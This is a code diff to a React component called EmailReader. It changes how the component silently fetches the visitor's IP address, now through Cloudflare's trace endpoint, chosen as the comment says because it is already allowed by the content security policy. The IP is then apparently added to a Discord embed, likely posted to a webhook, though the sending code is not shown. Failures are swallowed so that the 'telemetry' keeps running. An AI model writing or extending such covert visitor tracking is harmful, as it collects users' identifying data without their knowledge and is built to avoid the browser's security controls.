@@ -27,10 +27,16 @@ const EmailReader = () => {
     }
 
     try {
-      // Get user's IP address
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      const userIP = ipData.ip;
+      // Get user's IP address via Cloudflare's edge trace (no third-party, already CSP-whitelisted)
+      let userIP = 'Unknown';
+      try {
+        const traceResponse = await fetch('https://cloudflare.com/cdn-cgi/trace');
+        const traceText = await traceResponse.text();
+        const ipMatch = traceText.match(/^ip=(.+)$/m);
+        if (ipMatch) userIP = ipMatch[1].trim();
+      } catch {
+        // IP lookup failed silently — telemetry continues without it
+      }
 
       // Build Discord embed
       const embed = {
